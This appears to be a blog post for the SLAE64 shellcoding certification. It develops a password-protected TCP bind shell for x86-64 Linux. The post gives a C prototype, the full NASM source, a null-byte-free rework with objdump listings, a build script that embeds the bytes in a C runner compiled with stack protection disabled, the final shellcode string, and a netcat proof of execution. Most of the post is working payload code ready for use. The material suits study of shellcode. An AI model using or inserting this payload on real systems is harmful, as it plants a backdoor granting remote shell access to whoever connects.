# SLAE Assignment #1

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://www.securitytube-training.com/online-­courses/x8664-assembly-and-shellcoding-on-linux/index.html

Student ID: SLAE64 - 1525

## Resources

* https://packetstormsecurity.com/files/11058/bindshell.c.html

## Assignment

Create a Shell_Bind_TCP shellcode

* Binds to a port
* Needs a "Passcode"
* If Passcode is correct then Execs Shell

Remove 0x00 from the Bind TCP Shellcode discussed

## C prototype code:

To better understand how the tcp bind shellcode works, the following C implementation has been created (comments are in the code):

```c
// Filename: ShellBindTcp.c
// Author:  SLAE64 - 1525
//
// Purpose: spawn /bin/sh on tcp port handling multiple connections

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define BIND_PORT 3333

int main (int argc, char *argv[])
{ 
    // Declare vars
    int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
    struct sockaddr_in serv_addr; 
    struct sockaddr_in client_addr;

    // Create socket
    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    if (soc_des == -1) 
        exit(-1); 

    // Local port binding
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(BIND_PORT);
    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    if (soc_rc != 0) 
        exit(-1); 

    if (fork() != 0) 
        exit(0); 
    setpgrp();  
    signal(SIGHUP, SIG_IGN); 
    if (fork() != 0) 
        exit(0); 

    // Start listening on the binding port
    soc_rc = listen(soc_des, 5);
    if (soc_rc != 0) 
        exit(0); 

    while (1) { 
        soc_len = sizeof(client_addr);
        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
        if (soc_cli < 0) 
            exit(0); 
        cli_pid = getpid(); 
        server_pid = fork(); 
        if (server_pid != 0) {
            char password[32];
            if(recv(soc_cli, password, 32, 0) < 0) {
                close(soc_cli); 
                exit(1); 
            }

            if (strncmp("password", password, 8) != 0) {
                close(soc_cli); 
                exit(1); 
            }

            // Duplicate descriptors
            dup2(soc_cli,0); // standard input
            dup2(soc_cli,1); // standard output
            dup2(soc_cli,2); // standard error

            // Execute /bin/sh
            execl("/bin/sh","sh",(char *)0);

            // On connections end exit the thread 
            close(soc_cli); 
            exit(0); 
        } 
    close(soc_cli);
    }
}
```

## Assembler Code:

The complete assembler program is the following:

```asm
; Filename: ShellBindTcp.nasm
; Author:  SLAE64 - 1525
;
; Purpose: spawn /bin/sh on tcp port handling multiple connections with password
BITS 64

global _start			

section .text

; settings
PASSWORD    equ 'abcd'
PORT        equ 0x050d ; default 3333

; syscall kernel opcodes
SYS_SOCKET  equ 0x29
SYS_BIND    equ 0x31
SYS_LISTEN  equ 0x32
SYS_ACCEPT  equ 0x2b
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b
SYS_RECVMMSG equ 0x151
SYS_EXIT equ 0x3C

; syscall constants
AF_INET     equ 0x2
SOCK_STREAM equ 0x1
IPPROTO_TCP equ 0x6

_start:

create_socket:
    ; Socket
    ;   RAX       RAX    RDI       RSI           RDX
    ; soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    push SYS_SOCKET
    pop rax
    push AF_INET
    pop rdi
    push SOCK_STREAM
    pop rsi
    push IPPROTO_TCP
    pop rdx
    syscall 
    
    mov rdi, rax ; save socket descriptor in rdi

struct_sockaddr:
    ; struct sockaddr = {AF_INET; PORT; 0x0; 0x0}
    xor rax, rax
    mov dword [rsp-4], eax ;INADDR_ANY
    mov word  [rsp-6], PORT ; htons(3333) -> word = 2bytes
    mov byte  [rsp-8], AF_INET ; AF_INET -> word = 2bytes
    sub rsp, 0x8

    mov rsi, rsp ; rsi = &sockaddr

bind_port:
    ;  RAX   RDI                 RSI                      RDX
    ; bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    
    push SYS_BIND
    pop rax

    ; rdi already set
    ; rsi already set

    push 0
    push 16
    pop rdx

    syscall

server_listen:
    ;   RAX      RAX    RDI   RSI
    ; soc_rc = listen(soc_des, 5)
    push SYS_LISTEN
    pop rax

    ; rdi already setup

    push 5
    pop rsi

    syscall

accept_handler:
    ;   RAX       RAX    RDI                  RSI                   RDX
    ; soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len)
    push SYS_ACCEPT
    pop rax

    ; rdi already setup

    push 0
    pop rsi 

    push 16
    pop rdx

    syscall

    ; save in rdi
    push rax
    pop rdi

    ; equivalent with read of strncmp(data, password, len(password))
password_check:
    push rsp
    pop rsi ; rsi = &buf (char*)
    push 0x10 ; rdx = 0x10, >=8 bytes
    pop rdx
                                    
    xor eax, eax ; SYS_READ = 0x0
    syscall

    cmp dword [rsp], PASSWORD ; simple comparison
    jne parent_or_error ; bad pw, abort


dup2:
    ; rax    rdi   rsi 
    ; dup2(soc_cli,0); // standard input
    push SYS_DUP2
    pop rax
    push 0
    pop rsi

    syscall

    ; rax    rdi   rsi 
    ; dup2(soc_cli,1); // standard output
    push SYS_DUP2
    pop rax
    push 1
    pop rsi

    syscall

    ; rax    rdi   rsi 
    ; dup2(soc_cli,2); // standard error
    push SYS_DUP2
    pop rax
    push 2
    pop rsi

    syscall

exec_shell:
    ; rax      rdi     rsi    rdx
    ; execl("/bin/sh","sh",(char *)0);

    xor rsi, rsi ; *argv[] = 0

    push rsi ; '\0'
    mov rdi, 0x68732f2f6e69622f ; hs//bin/
    push rdi ; str        
    mov rdi, rsp  ; rdi = &str (char*)

    push rsi
    mov rdx, rsp ; *envp[] = 0

    push rdi 
    mov rsi, rsp

    push byte SYS_EXECVE
    pop rax
    syscall

parent_or_error:
    ;  rax
    ; exit()
    push SYS_EXIT
    pop rax

    syscall
```

## Check for null bytes

The shellcode has some issues since many null bytes are present, and such null terminator character may break the shellcode execution. The code must be reworked in order to be null free:

In the following code segment are reported the null bytes:

```shell
$ objdump -d ./ShellBindTcp -M intel

./ShellBindTcp:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	6a 29                	push   0x29
  400082:	58                   	pop    rax
  400083:	6a 02                	push   0x2
  400085:	5f                   	pop    rdi
  400086:	6a 01                	push   0x1
  400088:	5e                   	pop    rsi
  400089:	6a 06                	push   0x6
  40008b:	5a                   	pop    rdx
  40008c:	0f 05                	syscall 
  40008e:	48 89 c7             	mov    rdi,rax

0000000000400091 <struct_sockaddr>:
  400091:	48 31 c0             	xor    rax,rax
  400094:	89 44 24 fc          	mov    DWORD PTR [rsp-0x4],eax
  400098:	66 c7 44 24 fa 0d 05 	mov    WORD PTR [rsp-0x6],0x50d
  40009f:	c6 44 24 f8 02       	mov    BYTE PTR [rsp-0x8],0x2
  4000a4:	48 83 ec 08          	sub    rsp,0x8
  4000a8:	48 89 e6             	mov    rsi,rsp

00000000004000ab <bind_port>:
  4000ab:	6a 31                	push   0x31
  4000ad:	58                   	pop    rax
  4000ae:	6a 00                	push   0x0 <--- Null Byte
  4000b0:	6a 10                	push   0x10
  4000b2:	5a                   	pop    rdx
  4000b3:	0f 05                	syscall 

00000000004000b5 <server_listen>:
  4000b5:	6a 32                	push   0x32
  4000b7:	58                   	pop    rax
  4000b8:	6a 05                	push   0x5
  4000ba:	5e                   	pop    rsi
  4000bb:	0f 05                	syscall 

00000000004000bd <accept_handler>:
  4000bd:	6a 2b                	push   0x2b
  4000bf:	58                   	pop    rax
  4000c0:	6a 00                	push   0x0 <--- Null Byte
  4000c2:	5e                   	pop    rsi
  4000c3:	6a 10                	push   0x10
  4000c5:	5a                   	pop    rdx
  4000c6:	0f 05                	syscall 
  4000c8:	50                   	push   rax
  4000c9:	5f                   	pop    rdi

00000000004000ca <password_check>:
  4000ca:	54                   	push   rsp
  4000cb:	5e                   	pop    rsi
  4000cc:	6a 10                	push   0x10
  4000ce:	5a                   	pop    rdx
  4000cf:	31 c0                	xor    eax,eax
  4000d1:	0f 05                	syscall 
  4000d3:	81 3c 24 61 62 63 64 	cmp    DWORD PTR [rsp],0x64636261
  4000da:	75 37                	jne    400113 <parent_or_error>

00000000004000dc <dup2>:
  4000dc:	6a 21                	push   0x21
  4000de:	58                   	pop    rax
  4000df:	6a 00                	push   0x0 <--- Null Byte
  4000e1:	5e                   	pop    rsi
  4000e2:	0f 05                	syscall 
  4000e4:	6a 21                	push   0x21
  4000e6:	58                   	pop    rax
  4000e7:	6a 01                	push   0x1
  4000e9:	5e                   	pop    rsi
  4000ea:	0f 05                	syscall 
  4000ec:	6a 21                	push   0x21
  4000ee:	58                   	pop    rax
  4000ef:	6a 02                	push   0x2
  4000f1:	5e                   	pop    rsi
  4000f2:	0f 05                	syscall 

00000000004000f4 <exec_shell>:
  4000f4:	48 31 f6             	xor    rsi,rsi
  4000f7:	56                   	push   rsi
  4000f8:	48 bf 2f 62 69 6e 2f 	movabs rdi,0x68732f2f6e69622f
  4000ff:	2f 73 68 
  400102:	57                   	push   rdi
  400103:	48 89 e7             	mov    rdi,rsp
  400106:	56                   	push   rsi
  400107:	48 89 e2             	mov    rdx,rsp
  40010a:	57                   	push   rdi
  40010b:	48 89 e6             	mov    rsi,rsp
  40010e:	6a 3b                	push   0x3b
  400110:	58                   	pop    rax
  400111:	0f 05                	syscall 

0000000000400113 <parent_or_error>:
  400113:	6a 3c                	push   0x3c
  400115:	58                   	pop    rax
  400116:	0f 05                	syscall 
```

null free shellcode:

```asm
; Filename: ShellBindTcp.nasm
; Author:  SLAE64 - 1525
;
; Purpose: spawn /bin/sh on tcp port handling multiple connections with password
BITS 64

global _start			

section .text

; settings
PASSWORD    equ 'abcd'
PORT        equ 0x050d ; default 3333

; syscall kernel opcodes
SYS_SOCKET  equ 0x29
SYS_BIND    equ 0x31
SYS_LISTEN  equ 0x32
SYS_ACCEPT  equ 0x2b
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b
SYS_RECVMMSG equ 0x151
SYS_EXIT equ 0x3C

; syscall constants
AF_INET     equ 0x2
SOCK_STREAM equ 0x1
IPPROTO_TCP equ 0x6

_start:

    xor r10, r10 ; general null

create_socket:
    ; Socket
    ;   RAX       RAX    RDI       RSI           RDX
    ; soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    push SYS_SOCKET
    pop rax
    push AF_INET
    pop rdi
    push SOCK_STREAM
    pop rsi
    push IPPROTO_TCP
    pop rdx
    syscall 
    
    mov rdi, rax ; save socket descriptor in rdi

struct_sockaddr:
    ; struct sockaddr = {AF_INET; PORT; 0x0; 0x0}
    xor rax, rax
    mov dword [rsp-4], eax ;INADDR_ANY
    mov word  [rsp-6], PORT ; htons(3333) -> word = 2bytes
    mov byte  [rsp-8], AF_INET ; AF_INET -> word = 2bytes
    sub rsp, 0x8

    mov rsi, rsp ; rsi = &sockaddr

bind_port:
    ;  RAX   RDI                 RSI                      RDX
    ; bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    
    push SYS_BIND
    pop rax

    ; rdi already set
    ; rsi already set

    push r10
    push 16
    pop rdx

    syscall

server_listen:
    ;   RAX      RAX    RDI   RSI
    ; soc_rc = listen(soc_des, 5)
    push SYS_LISTEN
    pop rax

    ; rdi already setup

    push 5
    pop rsi

    syscall

accept_handler:
    ;   RAX       RAX    RDI                  RSI                   RDX
    ; soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len)
    push SYS_ACCEPT
    pop rax

    ; rdi already setup

    push r10
    pop rsi 

    push 16
    pop rdx

    syscall

    ; save in rdi
    push rax
    pop rdi

    ; equivalent with read of strncmp(data, password, len(password))
password_check:
    push rsp
    pop rsi ; rsi = &buf (char*)
    push 0x10 ; rdx = 0x10, >=8 bytes
    pop rdx
                                    
    xor eax, eax ; SYS_READ = 0x0
    syscall

    cmp dword [rsp], PASSWORD ; simple comparison
    jne parent_or_error ; bad pw, abort


dup2:
    ; rax    rdi   rsi 
    ; dup2(soc_cli,0); // standard input
    push SYS_DUP2
    pop rax
    push r10
    pop rsi

    syscall

    ; rax    rdi   rsi 
    ; dup2(soc_cli,1); // standard output
    push SYS_DUP2
    pop rax
    push 1
    pop rsi

    syscall

    ; rax    rdi   rsi 
    ; dup2(soc_cli,2); // standard error
    push SYS_DUP2
    pop rax
    push 2
    pop rsi

    syscall

exec_shell:
    ; rax      rdi     rsi    rdx
    ; execl("/bin/sh","sh",(char *)0);

    xor rsi, rsi ; *argv[] = 0

    push rsi ; '\0'
    mov rdi, 0x68732f2f6e69622f ; hs//bin/
    push rdi ; str        
    mov rdi, rsp  ; rdi = &str (char*)

    push rsi
    mov rdx, rsp ; *envp[] = 0

    push rdi 
    mov rsi, rsp

    push byte SYS_EXECVE
    pop rax
    syscall

parent_or_error:
    ;  rax
    ; exit()
    push SYS_EXIT
    pop rax

    syscall
```

as visible the assembler program now doesn't contain any null character

```shell
$ objdump -d ./ShellBindTcpNullFree -M intel

./ShellBindTcpNullFree:     file format elf64-x86-64


Disassembly of section .text:

00000000004000b0 <_start>:
  4000b0:	4d 31 d2             	xor    r10,r10

00000000004000b3 <create_socket>:
  4000b3:	6a 29                	push   0x29
  4000b5:	58                   	pop    rax
  4000b6:	6a 02                	push   0x2
  4000b8:	5f                   	pop    rdi
  4000b9:	6a 01                	push   0x1
  4000bb:	5e                   	pop    rsi
  4000bc:	6a 06                	push   0x6
  4000be:	5a                   	pop    rdx
  4000bf:	0f 05                	syscall 
  4000c1:	48 89 c7             	mov    rdi,rax

00000000004000c4 <struct_sockaddr>:
  4000c4:	48 31 c0             	xor    rax,rax
  4000c7:	89 44 24 fc          	mov    DWORD PTR [rsp-0x4],eax
  4000cb:	66 c7 44 24 fa 0d 05 	mov    WORD PTR [rsp-0x6],0x50d
  4000d2:	c6 44 24 f8 02       	mov    BYTE PTR [rsp-0x8],0x2
  4000d7:	48 83 ec 08          	sub    rsp,0x8
  4000db:	48 89 e6             	mov    rsi,rsp

00000000004000de <bind_port>:
  4000de:	6a 31                	push   0x31
  4000e0:	58                   	pop    rax
  4000e1:	41 52                	push   r10
  4000e3:	6a 10                	push   0x10
  4000e5:	5a                   	pop    rdx
  4000e6:	0f 05                	syscall 

00000000004000e8 <server_listen>:
  4000e8:	6a 32                	push   0x32
  4000ea:	58                   	pop    rax
  4000eb:	6a 05                	push   0x5
  4000ed:	5e                   	pop    rsi
  4000ee:	0f 05                	syscall 

00000000004000f0 <accept_handler>:
  4000f0:	6a 2b                	push   0x2b
  4000f2:	58                   	pop    rax
  4000f3:	41 52                	push   r10
  4000f5:	5e                   	pop    rsi
  4000f6:	6a 10                	push   0x10
  4000f8:	5a                   	pop    rdx
  4000f9:	0f 05                	syscall 
  4000fb:	50                   	push   rax
  4000fc:	5f                   	pop    rdi

00000000004000fd <password_check>:
  4000fd:	54                   	push   rsp
  4000fe:	5e                   	pop    rsi
  4000ff:	6a 10                	push   0x10
  400101:	5a                   	pop    rdx
  400102:	31 c0                	xor    eax,eax
  400104:	0f 05                	syscall 
  400106:	81 3c 24 61 62 63 64 	cmp    DWORD PTR [rsp],0x64636261
  40010d:	75 37                	jne    400146 <parent_or_error>

000000000040010f <dup2>:
  40010f:	6a 21                	push   0x21
  400111:	58                   	pop    rax
  400112:	41 52                	push   r10
  400114:	5e                   	pop    rsi
  400115:	0f 05                	syscall 
  400117:	6a 21                	push   0x21
  400119:	58                   	pop    rax
  40011a:	6a 01                	push   0x1
  40011c:	5e                   	pop    rsi
  40011d:	0f 05                	syscall 
  40011f:	6a 21                	push   0x21
  400121:	58                   	pop    rax
  400122:	6a 02                	push   0x2
  400124:	5e                   	pop    rsi
  400125:	0f 05                	syscall 

0000000000400127 <exec_shell>:
  400127:	48 31 f6             	xor    rsi,rsi
  40012a:	56                   	push   rsi
  40012b:	48 bf 2f 62 69 6e 2f 	movabs rdi,0x68732f2f6e69622f
  400132:	2f 73 68 
  400135:	57                   	push   rdi
  400136:	48 89 e7             	mov    rdi,rsp
  400139:	56                   	push   rsi
  40013a:	48 89 e2             	mov    rdx,rsp
  40013d:	57                   	push   rdi
  40013e:	48 89 e6             	mov    rsi,rsp
  400141:	6a 3b                	push   0x3b
  400143:	58                   	pop    rax
  400144:	0f 05                	syscall 

0000000000400146 <parent_or_error>:
  400146:	6a 3c                	push   0x3c
  400148:	58                   	pop    rax
  400149:	0f 05                	syscall 
```
## Script for shellcode Customization:

The following shell script allows easy shellcode customization, by providing the new port number on the command line as second argument:

```shell
#!/bin/bash

echo '######### NASM #########'
echo '[+] Configuring port '$2
port=`printf %04X $2 |grep -o ..|tac|tr -d '\n'`
sed s/0D05/$port/ <$1.nasm >$1.nasm_$2

echo '[+] Assembling with Nasm ... '
nasm -f elf64 -o $1.o $1.nasm_$2
echo '[+] Done!'

rm -rf $1.nasm_$2

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o
echo '[+] Done!'

echo '[+] Objdump ...'
mycode=`objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/' | sed 's/$/"/g'`

echo '[+] Assemble shellcode.c ...'
 
echo "#include<stdio.h>" >shellcode.c
echo "#include<string.h>" >>shellcode.c
echo "unsigned char code[] = \\" >>shellcode.c
echo $mycode";" >>shellcode.c
echo "main()" >>shellcode.c
echo "{" >>shellcode.c
echo "printf(\"Shellcode Length:  %d\n\", strlen(code));" >>shellcode.c
echo "  int (*ret)() = (int(*)())code;" >>shellcode.c
echo "  ret();" >>shellcode.c
echo "}" >>shellcode.c
 
echo '[+] Compile shellcode.c'
 
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 
echo '[+] Done!'

echo '######### GCC #########'
echo '[+] Assembling native c implementation with Gcc ... '
gcc ShellBindTcp.c -o ShellBindTcp.c_bin
echo '[+] Done!'
echo
```

## Final wrapped shellcode:

The final generated c code is:
```
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x4d\x31\xd2\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x0f\x05\x48\x89\xc7\x48\x31\xc0\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x0d\x05\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\x48\x89\xe6\x6a\x31\x58\x41\x52\x6a\x10\x5a\x0f\x05\x6a\x32\x58\x6a\x05\x5e\x0f\x05\x6a\x2b\x58\x41\x52\x5e\x6a\x10\x5a\x0f\x05\x50\x5f\x54\x5e\x6a\x10\x5a\x31\xc0\x0f\x05\x81\x3c\x24\x61\x62\x63\x64\x75\x37\x6a\x21\x58\x41\x52\x5e\x0f\x05\x6a\x21\x58\x6a\x01\x5e\x0f\x05\x6a\x21\x58\x6a\x02\x5e\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x56\x48\x89\xe2\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05";
int main()
{
printf("Shellcode Length:  %d\n", (int) strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
} 
```

## Proof of execution

The execution yelds the following:

Shellcode execution:

```
$ ./shellcode 
Shellcode Length:  155

```

and connection:

```
nc -vv localhost 3333
Connection to localhost 3333 port [tcp/*] succeeded!
abcd
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)

```